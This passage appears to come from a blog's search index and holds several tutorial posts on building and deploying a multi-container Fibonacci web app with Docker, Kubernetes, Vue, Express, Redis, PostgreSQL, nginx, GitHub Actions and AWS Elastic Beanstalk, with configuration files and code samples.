https://github.com/JackMcKew/multi-docker/blob/master/.github/workflows/google-cloud-cluster.yaml . We make sure to use the ${GITHUB_SHA} , when we're tagging our images versions, this is due to ensure that our kubernetes cluster ensures to update the images when we are running kubectl apply -f k8s . If we didn't add the SHA, they would be all tagged with :latest , and kubernetes wouldn't see an update. Make sure to update the cluster id in the command gcloud container clusters get-credentials my-first-cluster-1 with the cluster desired to update the kubernetes configuration, otherwise there'll be errors. Once this action has successfully completed, we can head to the Workloads page of our project and we should be able to see all the deployment configurations that we set up to be deployed. Setting up Ingress-Nginx Before we can access our application through an IP or web address, we need to set up ingress-nginx , similar to how we did with docker-compose in previous posts. Luckily, we can make use of helm to add this functionality for us (provided we'd set up nginx configuration like we already have). This can be done by sshing into the terminal of our Kubernetes cluster, or similarly making use of the Cloud Shell provided by Google Cloud. Firstly which we need to install helm ( https://helm.sh/docs/intro/install/#from-script ): 1 2 3 curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/master/scripts/get-helm-3 chmod 700 get_helm.sh ./get_helm.sh Followed by setting up ingress-nginx ( https://kubernetes.github.io/ingress-nginx/deploy/#using-helm ): 1 2 helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx helm install my-release ingress-nginx/ingress-nginx Success Now we head to our Services & Ingress page in our project, where we can see all the pods that are used for hosting endpoints. Provided the ingress-nginx service has been created, there should be a External Load Balancer service with an IP, that we can access. Heading to this IP will lead us to our application! If we wanted to set up an actual web address, we'd need to purchase a domain, set the A record as the IP for our external load balancer, and finally set up a certificate manager to handle the https authentication. Javascript Source(s): mermaid.min.js","tags":"Software","url":"https://jackmckew.dev/deploying-with-kubernetes.html","loc":"https://jackmckew.dev/deploying-with-kubernetes.html"},{"title":"Developing with Kubernetes","text":"Following on with previous posts on this blog. This post will be going through how to develop & later on deploy our fibonacci application we previously built in a multi-container context. To reiterate we will be using the following technologies: Technology Use Docker Docker will be used to containerization of the services inside our app Vue Vue is the front-end JavaScript framework that we will use Express Express is responsible for the API between Redis, PostgreSQL and Vue Redis Redis will store/retrieve any local data used by our users PostgreSQL PostgreSQL will be our database Nginx Nginx will handle the routing between our services Previously we made use of services provided by AWS for Redis & PostgreSQL, in this post these services will be run inside their own pods. This post is apart of a series on Docker/Kubernetes, find the other posts at: Intro to Docker Develop and Develop with Docker Develop and Develop Multi Container Applications Intro to Kubernetes Developing with Kubernetes Deploying with Kubernetes Deploy a Node Web App to AWS Elastic Beanstalk with Docker The Architecture To make our application run on Kubernetes, we need to make a few changes. In essence though the architecture will graph LR subgraph Node tr>Traffic] --> is[Ingress Service] is --> cl[Client Deployment] is --> se[Server Deployment] se --> re[(Redis Deployment)] se --> po[(PostgreSQL Deployment)] po --> pv[PostgreSQL PVC] wo(Worker Deployment) --> re end The above chart was made with mermaid.js . For each of the deployments (except the worker) we will be creating a ClusterIP service for maintaining the connection between each of the deployments. The PostgreSQL PVC is for a Persistent Volume Claim, which allows our node to consume abstract storage resources (we'll go into this further later on). ClusterIP Service We need to set up a ClusterIP service for each of our deployments except the worker deployment. This will allow our services to communicate with others inside the node. To do this, we create a configuration yaml file: 1 2 3 4 5 6 7 8 9 10 apiVersion : v1 kind : Service metadata : name : client-clusterip-service spec : selector : component : web ports : - port : 80 targetPort : 80 Note that we keep the same selector as our deployments. ClusterIP is the default ServiceType in kubernetes. We can create multiple objects in a single yaml file by separating with --- Persistent Volume Claim A persistent volume allows a pod to share memory and read/write data on the host PC. The use-case for this are if our PostgreSQL database pod had crashed without a PVC, the data would essentially be lost as it was entirely contained within the pod, but with a persistent volume claim, our pod can restart by using the data that is stored on the host PC. We use a PVC over a persistent volume or a volume, as this allows us to declare the requirement that our pod needs storage at some point, rather than create an instance of storage prematurely, and gives more control to Kubernetes to solve our storage problem for us. Volumes on their lonesome are tied directly to pods, and thus if the pod crashes, the volume will be lost. Hence why we are not using volumes in this case. A volume is also different between Kubernetes and Docker. A persistant volume is not tied directly to pods, but is tied to the node overall, and thus if the node as a whole crashes, the data will be lost. PVC Configuration Similar to how we attach a ClusterIP service to a pod, let's attach a PVC to a pod. What this will do, will instruct Kubernetes to 'advertise' storage space for pods to consume. If a pod consumes this claim, then it'll go and create a persistent volume or point to an already created persistent volume for us automatically. There is also many access modes we can define for our PVC: Access Mode Description ReadWriteOnce Can be used by a single node ReadOnlyMany Multiple nodes can read ReadWriteMany Can be read / written to by many nodes 1 2 3 4 5 6 7 8 9 10 apiVersion : v1 kind : PersistentVolumeClaim metadata : name : database-persistent-volume-claim spec : accessModes : - ReadWriteOnce resources : requests : storage : 2Gi This configuration will allow a single node access to 2 gigabytes of storage space available for both read & write operations. Ensure that the pods that will access this volume claim have provided it under the spec tag in the pod configuration. Similarly, we can specify resource requirements/restraints in pods (eg, CPU resources). Environment Variables Some of our pods depend on environment variables being set to work correctly (eg, REDIS_HOST, PGUSER, etc). We add using the env key to our spec > containers configuration. For example, for our worker to connect to the redis deployment: 1 2 3 4 5 6 7 8 9 spec : containers : - name : worker image : jackmckew/multi-docker-worker env : - name : REDIS_HOST value : redis-cluster-ip-service - name : REDIS_PORT value : 6379 Note that for the value of the REDIS_HOST we are stating the name of the ClusterIP service we had previously set up. Kubernetes will automatically resolve this for us to be the correct IP, how neat! Secrets Secrets are another type of object inside of Kubernetes that are used to store sensitive information we don't want to live in the plain text of the configuration files. We do this through a kubectl commad: 1 kubectl create secret [ secret_type ] [ secret_name ] --from-literal key = value There are 3 types of secret types, generic , docker_registry and tls , most of the time we'll be making use of the generic secret type. Similar to how we consume other services, we will be consuming the secret from the secret_name parameter. The names (but not the value) can always be retrieved through kubectl get secrets . Secrets are pertained only on the current machine, so this will not be transferred when moving to production or another machine, so be sure to repeat the process. Consuming Secrets as Environment Variable Consuming a secret as an environment variable for a container is a little different to other environment variables. As secrets can contain multiple key value pairs, we need to specify the secret and the key to retrieve the value from: 1 2 3 4 5 - name : ENVIRONMENT_VAR_NAME valueFrom : secretKeyRef : name : secret_name key : key Ingress Service The ingress service allows us to connect to other Kubernetes cluster from outside, and thus maintains how we should treat incoming requests and how to route them. The entirety of our configuration for the ingress service is: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 apiVersion : networking.k8s.io/v1beta1 kind : Ingress metadata : name : ingress-service annotations : kubernetes.io/ingress.class : nginx nginx.ingress.kubernetes.io/use-regex : \"true\" nginx.ingress.kubernetes.io/rewrite-target : /$1 spec : rules : - http : paths : - path : /?(.*) backend : serviceName : client-cluster-ip-service servicePort : 8080 - path : /fib/?(.*) backend : serviceName : client-cluster-ip-service servicePort : 8080 - path : /api/?(.*) backend : serviceName : server-cluster-ip-service servicePort : 5000 Note that we make use of rewrite-target, this means that: test.com/something rewrites to test.com/ test.com/somethingelse rewrites to test.com/ test.com/fib rewrites to test.com/fib/ Any requests for test.com/api get routed to the specific server service for handling, while any others get sent to the front end. Deploy! Now we are ready to deploy our Kubernetes cluster onto a cloud provider, this was originally detailed in this part of the post, but grew far longer than expected so another post was created! Javascript Source(s): mermaid.min.js","tags":"Software","url":"https://jackmckew.dev/developing-with-kubernetes.html","loc":"https://jackmckew.dev/developing-with-kubernetes.html"},{"title":"Intro to Kubernetes","text":"Kubernetes is a portable, extensible, open-source platform for managing containerized workloads and services, that facilitates both declarative configuration and automation. We use Kubernetes as a platform for orchestrating multiple Docker containers for our application, and enables us to scale our application easily. Kubernetes is managed via a master node, and worker nodes, in combination we call this a cluster. We give instructions to the master node on how we want the cluster to run, and how many workers we need. This post is apart of a series on Docker/Kubernetes, find the other posts at: Intro to Docker Develop and Develop with Docker Develop and Develop Multi Container Applications Developing with Kubernetes Deploying with Kubernetes Deploy a Node Web App to AWS Elastic Beanstalk with Docker Minikube Minikube is a way of running a development cluster on our local PC. When running in production however, we use managed services offered by different platforms (eg, AWS, GCP, etc). To interact with minikube as it is running though, we use another tool called kubectl . Docker Compose to Kubernetes Docker Compose Terminology Kubernetes Terminology Each entry could build an image Kubernetes expects all images to be built Each entry represents a container One config file per object we want to create Each entry defines the networking configuration (ports) We have to set up all networking manually What's an Object? Notice that we mentioned objects as the equivalent in Kubernetes, but what does this mean? Objects serve different purposes: Running a container Monitoring a container Setting up networking etc Example object types include: StatefulSet ReplicaController Pod Service There are multiple API versions which gives us access to a different set of object types Pods Pods let us run containers within nodes. These are one of the most basic objects we can create within Kubernetes. Typically we only put containers that are tightly coupled together within a pod. For example, we might run a database pod which is comprised of 3 containers, the database runtime, a logger and a backup manager. Since if any of these are solely dependant on other containers running, it makes sense to group them together in a pod. Services Services let us set up networking within a Kubernetes cluster. There is also 4 sub-types of services: ClusterIP NodePort Ingress LoadBalancer NodePort services allow us to expose a container to the outside network (only for development purposes). We can use selectors and labels to be the equivalent of our service names in docker-compose. Deployment The deployment object type is better for running groups of identical pods, as the master can manage all the changes & updates for our pods for us (see below for limitations when using pods alone). Similar to the pod yaml file, the template tag takes the exact same information to create any number of pods (replicas) as specified. Ensure to use matchLabels if using labels for the pods, as this will give the master information for updating the cluster. We can check all the deployments currently running with kubectl get deployments . Kubectl Kubectl is the tool that we use to manage our Kubernetes clusters. If we want to pass a config file into kubectl we use the command kubectl apply -f [filename] . Similar to docker ps , if we want to see all the running pods in our cluster, we can run kubectl get pods . Furthermore, to get all the running services we can run kubectl get services . Once we have a pod running, we can check to see what containers are running with docker ps . If we kill the container running inside the pod, we will notice that if we run docker ps once again, it'll be live again. Kubernetes will try to restart any containers if anything goes wrong. Kubernetes will try it's best to keep the application in the state that we provide in the configuration. Update Existing Object If a configuration has been provided a name in the metadata , the running object can be updated by changing the configuration provided the name remains the same. This updated configuration can then be applied with kubectl apply -f [filename] . There is only a specific number of parameters we can change with this (eg for pods: image, activeDeadlineSeconds, etc). Which you will see an error if the variable falls outside the provided. For maintaining sets of identical pods, we can bypass the limitations on what fields we can update with the Deployment object kind. Pods are good for one-off development purposes, while Deployments are better for development & production. Deployment updates work by attempting to make the changes, and if the above error occurs, it'll automatically kill the pod and restart with the updated configuration. Get Info about an Existing Object If we had an object running within a cluster, and we wanted to get information about it, we can run kubectl describe [object_type] [object_name] . Similarly, we can extract information about all objects of a certain type in the cluster by omitting the object_name . So our command would be kubectl [object_type] . Deleting Existing Objects Similar to docker stop , we can use kubectl delete -f [config_yaml] to stop and delete an object from the cluster. Update Deployment Images A workflow for Kubernetes is we want our application to keep running, and when we push a new image to Docker Hub, we want our Kubernetes cluster to update the objects running on this image, with the updated image. This is very challenging, here is a very thorough thread on a conversation discussing ways to do this: https://github.com/kubernetes/kubernetes/issues/33664 To do this imperatively, we ensure that the image we will be pulling is tagged with versioning on Docker Hub. After this we are able to run the command 1 kubectl set image [ object_type ] / [ object_name ] [ container_name ] = [ new_image_to_use ] After running this command, the deployment will update the running pods with the new image.","tags":"Software","url":"https://jackmckew.dev/intro-to-kubernetes.html","loc":"https://jackmckew.dev/intro-to-kubernetes.html"},{"title":"Develop and Deploy Multi-Container Applications","text":"Following on with previous posts on this blog. This post will be going through how to develop & deploy a multi-container application, our application (albeit basic) will allow users to input a number which will correspond to the index in the Fibonacci sequence, and our application will respond with the computed number. Redis will store this number locally to give users a list of recently requested indexes, and PostgreSQL will store the input and output. More specifically we will be using the following technologies: Technology Use Docker Docker will be used to containerization of the services inside our app Amazon Web Services (AWS) Elastic Beanstalk Elastic Beanstalk will manage the deployment of our application Vue Vue is the front-end JavaScript framework that we will use Express Express is responsible for the API between Redis, PostgreSQL and Vue Redis Redis will store/retrieve any local data used by our users PostgreSQL PostgreSQL will be our database Nginx Nginx will handle the routing between our services Github Actions Github Actions will be our CI/CD platform for running tests before deploying Let's start by diving into each of the services inside our application and how to set them up. This post won't go into how to Dockerize each service in particular, more so how to connect them all together. Find all the source code for this project at: https://github.com/JackMcKew/multi-docker This post is apart of a series on Docker/Kubernetes, find the other posts at: Intro to Docker Develop and Develop with Docker Intro to Kubernetes Developing with Kubernetes Deploying with Kubernetes Deploy a Node Web App to AWS Elastic Beanstalk with Docker Vue Find all the source code for the front end client at: https://github.com/JackMcKew/multi-docker/tree/master/client Vue is a JavaScript framework for creating user interfaces. We will be using it for the 'front-end' portion of the application. Vue can be installed through npm and once installed, we can run vue create project_name in the command line to create a template project for us. There is many options to enable in the creation of a project, a good option is to enable both unit testing & typescript. Once the project has been created, we can navigate into the directory and run npm run serve , this will set up our Vue project to enable us to visit localhost:8080 . Now to set up the user interface for our users to input the index of the fibonacci sequence they wish to calculate, we need to set up a new page for the users to land on. This will involve changing things in 3 places: components, views and router. This is what we will be building with Vue: FibInputForm Component Components are pieces of user interface that we can access in multiple parts of our application, we build a component which will contain both the HTML and javascript for driving the user input, and for displaying the output retrieved from Redis or PostgreSQL. Vue components are typically comprised of a template block and a corresponding script and style block. When writing the template for a component, there is numerous Vue specific attributes that we can provide the elements in the HTML. For this project we will make use of Bulma/Buefy CSS (which can be installed with npm install bulma or npm install buefy ) for our styling. We create a file named FibInputForm.vue inside project_name/src/components with the contents: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 < template > < div class = \"box\" > < div class = \"columns is-centered\" > < form @ submit . prevent = \"handleSubmit\" > < div class = \"field has-addons \" > < div class = \"control\" > < input v-model = \"inputValue\" onfocus = \"if(this.value == 'Enter a value') { this.value = ''; }\" class = \"input is-primary\" type = \"text\" /> </ div > < div class = \"control\" > < button class = \"button is-primary\" type = \"submit\" > Submit </ button > </ div > </ div > </ form > </ div > < ul v-if = \"seenIndexes && seenIndexes.length\" > < h3 > Indexes I have seen: </ h3 > < p > {{ seenIndexes.map((x) => x.number).join(\", \") }} </ p > </ ul > < ul > < h3 > Calculated Values: </ h3 > < li v-for = \"(value, name) in values\" :key = \"name\" > < p > For index {{ name }}, I calculated {{ value }} </ p > </ li > </ ul > </ div > </ template > < script > import axios from \"axios\" ; export default { name : \"FibInput\" , data () { return { seenIndexes : [], values : {}, index : \"\" , inputValue : \"Enter a value\" , }; }, // // Fetches posts when the component is created. async created () { try { const values = await axios . get ( \"/api/values/current\" ); this . values = values . data ; // this.values = await axios.get(\"/api/values/current\"); const indexes = await axios . get ( \"/api/values/all\" ); this . seenIndexes = indexes . data ; } catch ( e ) { this . errors . push ( e ); } }, methods : { async handleSubmit () { await axios . post ( \"/api/values\" , { index : this . inputValue , }); this . index = \"\" ; window . location . reload (); }, }, }; </ script > To briefly cover the functionality above, the template is built up of 3 parts, the input form where users submit an index to query, a list of the latest indexes as stored in Redis separated by a comma and finally a list of the calculated as retrieved from the PostgreSQL database. We use axios to interface we the API that we will create with express . We query the API upon load, and the page is always reloaded when submit is pressed. Now that this has been exported, it can be imported from any other point in our web application and placed in with a <FibInputForm/> element! Neat! FibInputPage View Now that we have our component, we need a page to put it on! We create a new file within project_name/src/views named FibInputPage.vue with the contents: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 < template > < section class = \"section\" > < div class = \"container\" > < div class = \"columns is-centered\" > < div class = \"column is-half\" > < FibInputForm /> </ div > </ div > </ div > </ section > </ template > < script > // @ is an alias to /src import FibInputForm from \"@/components/FibInputForm.vue\" ; export default { name : \"Fib\" , components : { FibInputForm , }, }; </ script > As we can see above, we've imported our neat little FibInputForm and used it after placing it in a centered section. Again we export the page view so we can import into the router to make sure it's linked to a URL. Routing the Page Lastly for Vue, we need to set up a route so users can reach our page, both within the vue-router and on the main page ( App.vue ). Routes are all defined within project_name/router/index.ts . So we need to add in a new one for our FibInputPage by adding the following object into the routes array: 1 2 3 4 5 6 7 8 9 { path: \"/fib\", name: \"Fib\", // route level code-splitting // this generates a separate chunk (about.[hash].js) for this route // which is lazy-loaded when the route is visited. component: () => import(/* webpackChunkName: \"about\" */ \"../views/FibInputPage.vue\"), }, Next to ensure the route is accessible from a link on the page, add a router-link element into the template of App.vue : 1 < router-link to = \"/fib\" > Fib </ router-link > | Redis Find all the source code for the redis service at: https://github.com/JackMcKew/multi-docker/tree/master/worker Redis is an open source, in-memory data store, we give it a key and a value, which it'll store. Later we can ask with the key, and get the value back. We are going to set up two parts to make this service work as expected. The redis runtime is managed for us directly from using the redis image as provided on Docker Hub, but we need to make a node.js project to interface with it. We do this by creating 3 files: package.json , index.js and keys.js . package.json defines what dependencies need to be installed, and how to run the project. index.js manages the redis client and contains the functionality for calculating the fibonacci sequence when given an index. keys.js contains any environment variables that the project may need. In particular we use environment variables so docker-compose can link all the services together later on. Here is the code for the core of this project, index.js : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 const keys = require ( \"./keys\" ); const redis = require ( \"redis\" ); const redisClient = redis . createClient ({ host : keys . redisHost , port : keys . redisPort , retry_strategy : () => 1000 , }); const sub = redisClient . duplicate (); function fib ( index ) { if ( index < 2 ) return 1 ; return fib ( index - 1 ) + fib ( index - 2 ); } sub . on ( \"message\" , ( channel , message ) => { redisClient . hset ( \"values\" , message , fib ( parseInt ( message ))); }); sub . subscribe ( \"insert\" ); As we can see, we initialise a redis client as per the environment variables set in keys.js , we create a duplicate of the client because we wish to interact with it (must duplicate the client otherwise when communicating we'll end up with one big mess). We define our ever so special fibonacci function (this is slow on purpose) and finally we set a method that when given a message will communicate with redis for us. PostgreSQL Find all the source code for the PostgreSQL service at: https://github.com/JackMcKew/multi-docker/tree/master/server We are going to use the PostgreSQL service part of our project to contain the interface with the database, and the API with express . Very similar to our redis project, we need a package.json , index.js and keys.js . Let's dive straight into the code inside index.js : 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 const keys = require ( \"./keys\" ); // Express App Setup const express = require ( \"express\" ); const bodyParser = require ( \"body-parser\" ); const cors = require ( \"cors\" ); const app = express (); app . use ( cors ()); app . use ( bodyParser . json ()); // Create and Connect to Postgres Client const { Pool } = require ( \"pg\" ); const pgClient = new Pool ({ user : keys . pgUser , host : keys . pgHost , database : keys . pgDatabase , password : keys . pgPassword , port : keys . pgPort , }); pgClient . on ( 'connect' , () => { pgClient . query ( 'CREATE TABLE IF NOT EXISTS values (number INT)' ) . catch (( err ) => console . log ( err )) }) // Create and Connect to Redis Client const redis = require ( \"redis\" ); const redisClient = redis . createClient ({ host : keys . redisHost , port : keys . redisPort , retry_strategy : () => 1000 , }); const redisPublisher = redisClient . duplicate (); // Express Route Handlers // Test Route app . get ( \"/\" , ( req , res ) => { res . send ( \"Hello there\" ); }); // All indices submitted to DB app . get ( \"/values/all\" , async ( req , res ) => { const values = await pgClient . query ( \"SELECT * FROM values\" ); res . send ( values . rows ); // res.send(values.map(x => x.number)) }); // Get current indices in Redis app . get ( \"/values/current\" , async ( req , res ) => { redisClient . hgetall ( \"values\" , ( err , values ) => { res . send ( values ); }); }); // Receive new values app . post ( \"/values\" , async ( req , res ) => { const index = req . body . index ; if ( parseInt ( index ) > 40 ) { return res . status ( 422 ). send ( \"Index too high, try smaller number\" ); } redisClient . hset ( \"values\" , index , \"Nothing yet!\" ); redisPublisher . publish ( \"insert\" , index ); pgClient . query ( \"INSERT INTO values(number) VALUES($1)\" , [ index ]); res . send ({ working : true }); }); app . listen ( 5000 , ( error ) => { console . log ( \"Listening\" ); }); We do a series of things here: Initialise our express router which will be the API Create a client for the PostgreSQL database (ensuring to create a table if it doesn't exist) Create another client for our redis service, which will publish any keys requested as to show to the user later on Set up our API end points, to either get all the indexes ever requested or the latest Set up the API post method, which will handle sending the request to redis and storing in the database Listen on the port for any incoming requests! Nginx Nginx in this project helps us create all the connections between the services and for them all to play nicely. How nginx works is by defining any connections in a configuration file, and pass that configuration file upon runtime. This is our default.conf nginx configuration for this project: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 upstream client { server client : 8080 ; } upstream api { server api : 5000 ; } server { listen 80 ; location / { proxy_pass http://client ; } location /api { rewrite /api/(.*) / $1 break ; proxy_pass http://api ; } } We are doing a series of things once again: Our Vue front end listens on port 8080 by default, so that's where the client connection lives Our API back-end (PostgreSQL) is listening on port 5000 Our nginx runtime will listen on port 80 and route as required We also set up a few locations, these help nginx 'finish' the route. / means any incoming connection, pass it off to the front end to render. If any request connection comes in containing /api then we want to pass that request to the service, so we rewrite the URL to be the correct URL. Docker Compose Now that we've got our individual services all configured, we need a way to run them all at the same time. We need to create a docker-compose.yml which will contain all the environment variables, and how each service depend/connect to each other so we can run it all! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 version : \"3\" services : postgres : image : \"postgres:latest\" environment : - POSTGRES_PASSWORD=postgres_password redis : image : \"redis:latest\" api : depends_on : - postgres build : dockerfile : Dockerfile.dev context : ./server volumes : - /app/node_modules - ./server:/app environment : - REDIS_HOST=redis - REDIS_PORT=6379 - PGUSER=postgres - PGHOST=postgres - PGDATABASE=postgres - PGPASSWORD=postgres_password - PGPORT=5432 client : build : dockerfile : Dockerfile.dev context : ./client volumes : - /app/node_modules - ./client:/app worker : build : dockerfile : Dockerfile.dev context : ./worker volumes : - /app/node_modules - ./worker:/app environment : - REDIS_HOST=redis - REDIS_PORT=6379 nginx : depends_on : - api - client restart : always build : dockerfile : Dockerfile.dev context : ./nginx ports : - \"8000:80\" Here we are setting up all of the docker containers we wish to run in parallel that will make up our entire project: PostgreSQL Container We use the postgres image on Docker Hub and must pass in the default password to get into it Redis Container We use the redis image on Docker Hub (that easy!) API Container This contains the code behind the API which interfaces with redis & postgres Client Container Our Vue frontend that the users will see Worker Container This contains the code to calculate the fibonacci sequence by interfacing with the redis runtime Nginx Container Our nginx container that'll handle all the routing in between each of the services, this is what is exposed on port 8000 on the local PC when we run all these containers Note that our environment variables (which were set in keys.js earlier), are just the name of the service given in the docker-compose.yml file. Docker Compose handles all the renaming when each service is connected up for us! How awesome is that! Github Actions Now that we've set all of services and make sure they place nice in Docker Compose, it's time to implement CI/CD with Github Actions so whenever we push new versions of our code, it'll automatically test that everything works and deploy our new version of the application. We do this by creating a test-and-deploy.yml within .github/workflows/ which contains: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 name : Test & Deploy on : push : branches : - master jobs : test-and-deploy : runs-on : ubuntu-latest steps : - name : Checkout Latest Repo uses : actions/checkout@master - name : Build Dev Docker Image - Client run : docker build -t jackmckew/multi-docker-dev -f ./client/Dockerfile.dev ./client - name : Run Test Suite - Client run : docker run -e CI=true jackmckew/multi-docker-dev npm run test:unit # Deploy to Dockerhub - name : Build and Push Production Container - Client if : success() uses : docker/build-push-action@v1 with : username : ${{ secrets.DOCKER_USERNAME }} password : ${{ secrets.DOCKER_PASSWORD }} repository : jackmckew/multi-docker-client tags : latest path : ./client - name : Build and Push Production Container - Server if : success() uses : docker/build-push-action@v1 with : username : ${{ secrets.DOCKER_USERNAME }} password : ${{ secrets.DOCKER_PASSWORD }} repository : jackmckew/multi-docker-server tags : latest path : ./server - name : Build and Push Production Container - Nginx if : success() uses : docker/build-push-action@v1 with : username : ${{ secrets.DOCKER_USERNAME }} password : ${{ secrets.DOCKER_PASSWORD }} repository : jackmckew/multi-docker-nginx tags : latest path : ./nginx - name : Build and Push Production Container - Worker if : success() uses : docker/build-push-action@v1 with : username : ${{ secrets.DOCKER_USERNAME }} password : ${{ secrets.DOCKER_PASSWORD }} repository : jackmckew/multi-docker-worker tags : latest path : ./worker - name : Generate deployment package run : zip -r deploy.zip . -x '*.git*' - name : Deploy to EB uses : einaregilsson/beanstalk-deploy@v11 with : aws_access_key : ${{ secrets.AWS_ACCESS_KEY_ID }} aws_secret_key : ${{ secrets.AWS_SECRET_ACCESS_KEY }} application_name : mulit-docker environment_name : MulitDocker-env version_label : 12345 version_description : ${{github.SHA}} region : ap-southeast-2 deployment_package : deploy.zip We are doing the following steps: Get the latest copy of all the source code Build & Test our application to make sure it works Build & Publish each container to Docker Hub so any other deployment service can pull directly from there Deploy our application to Elastic Beanstalk Docker Hub Everything's now set up! For another user or a deployment service to get each of the images for the services they've created they can now simply run docker run jackmckew/multi-docker-client and that's it! It should run on any operating system provided Docker is installed, how cool is that! Deploying to AWS Elastic Beanstalk Now we want to deploy this application to Elastic Beanstalk, that means we need to create a Dockerrun.aws.json which is very similar to that of the docker-compose.yml . The contents of the json file will be: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 { \"AWSEBDockerrunVersion\" : 2 , \"containerDefinitions\" : [{ \"name\" : \"client\" , \"image\" : \"jackmckew/multi-docker-client\" , \"hostname\" : \"client\" , \"essential\" : false , \"memory\" : 128 }, { \"name\" : \"server\" , \"image\" : \"jackmckew/multi-docker-server\" , \"hostname\" : \"api\" , \"essential\" : false , \"memory\" : 128 }, { \"name\" : \"worker\" , \"image\" : \"jackmckew/multi-docker-worker\" , \"hostname\" : \"worker\" , \"essential\" : false , \"memory\" : 128 }, { \"name\" : \"nginx\" , \"image\" : \"jackmckew/multi-docker-nginx\" , \"essential\" : true , \"portMappings\" : [{ \"hostPort\" : 80 , \"containerPort\" : 80 }], \"links\" : [ \"client\" , \"server\" ], \"memory\" : 128 } ] } Now provided we've set up the following: RDS - Redis ElasticCache - PostgreSQL VPC - Security Group Initialized all the environment variables in the EB instance We should be able to push to Github and see our application be deployed!","tags":"Software","url":"https://jackmckew.dev/develop-and-deploy-multi-container-applications.html","loc":"https://jackmckew.dev/develop-and-deploy-multi-container-applications.html"},{"title":"Develop and Deploy with Docker","text":"This post is intended to work through setting up a workflow with Docker. In particular, we will be setting up a production workflow for a web app. For this web app, we will need a workflow which supports: Develop Test Deploy We also want to be able to come back at a later date, further develop a feature and have the remaining steps be automated. At the centre of the workflow will be a repository (hosted in Github). Here's a screenshot of the final application: This post will not be going through the details of how to utilise git/github. This workflow is 100% achievable without Docker, although Docker will make things much easier. This post is apart of a series on Docker/Kubernetes, find the other posts at: Intro to Docker Develop and Develop Multi Container Applications Intro to Kubernetes Developing with Kubernetes Deploying with Kubernetes Deploy a Node Web App to AWS Elastic Beanstalk with Docker The Web Application For the web app we will use React, which is a javascript framework for managing the front end of applications. To generate the web app boilerplate for us, we will use create-react-app . For running this, ensure that Node.js is installed on the local PC. Finally run the command below, to initialise the front end component of React of our web app. 1 npx create-react-app frontend --template typescript Typescript is optional, but highly recommended. Dockerfile For this workflow we're going to set up two Dockerfiles, one for developing and one for production. Let's start with the developers Dockerfile, which we will aptly name Dockerfile.dev , we must ensure to add the -f flag along with the filename when building the Docker image with docker build -f Dockerfile.dev . . The contents of our Dockerfile.dev will contain: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 FROM node:alpine WORKDIR '/app' # Copy dependencies and install COPY package.json . RUN npm install # Copy everything else COPY . . # Start development server CMD [\"npm\",\"run\",\"start\"] To circumvent the issue in that Docker typically takes snapshots of the code and we want our app to update on save, we use mount to create a 'reference' to our folder on the local PC. We do this by running the command: 1 docker run -it -p 8000 :3000 -v /app/node_modules -v ${ pwd } :/app [ image_id ] If using Windows, replace the ${pwd} with the full path to the folder, ensuring to swap all backslashes to forwards slashes and changing C: to /C/ . Here is an example: 1 docker run -it -p 8000 :3000 -v /app/node_modules -v /C/Users/jackm/Documents/GitHub/docker-kubernetes-course/frontend:/app [ image_id ] Docker Compose Rather than using the rather large command above, let's use Docker Compose. 1 2 3 4 5 6 7 8 9 10 11 12 version : \"3\" services : react-app : restart : always build : context : . dockerfile : Dockerfile.dev ports : - \"8000:3000\" volumes : - /app/node_modules - .:/app To break this yaml file down: We create a react-app service It'll always try to restart if it crashes for any reason We want to build the container from the current directory (where the react app lives) and from the Dockerfile.dev We map port 8000 on the local PC to port 3000 of the container We mount the current directory to the app directory in the container for updating in sync Again, if using Windows, we need to add some more options to our service: 1 2 3 4 stdin_open : true tty : true environment : - CHOKIDAR_USEPOLLING=true Running Tests There are two methodologies to run tests on running containers: Attach with `docker exec -it [image_id] Run in docker-compose Option 1 can be cumbersome as we will need to do this each time when running a container. Option 2 is achieved by creating a new service in our docker-compose.yml file: 1 2 3 4 5 6 7 8 9 10 11 12 tests : stdin_open : true tty : true environment : - CHOKIDAR_USEPOLLING=true build : context : . dockerfile : Dockerfile.dev volumes : - /app/node_modules - .:/app command : [ \"npm\" , \"run\" , \"test\" ] Notice it is similar to the service created for react-app only with the new command npm run test . Now if any new tests are included in the test suite, the tests should be re-ran within the container. This will mix the output logging from the two services, we may be difficult to read. If using VS Code, the terminal seems to handle this nicely. Nginx For the production version of our application, we won't have access to the developer server, so to fill this gap, we will use nginx . For this we will need a second Dockerfile, specific for running our application in production. In our new production Dockerfile, we will make use of a multi-stage docker build sequence. In essence, the steps will be: Build step: Pull base image Copy dependencies Install dependencies Build application Run step: Use nginx image Copy result of built application Start nginx Multi-stage Dockerfile To implement our multi-stage Dockerfile as above we do this we the following yaml: 1 2 3 4 5 6 7 8 9 10 11 # Build stage FROM node:alpine as builder WORKDIR '/app' COPY package.json . RUN npm install COPY . . RUN npm run build # Run stage FROM nginx COPY 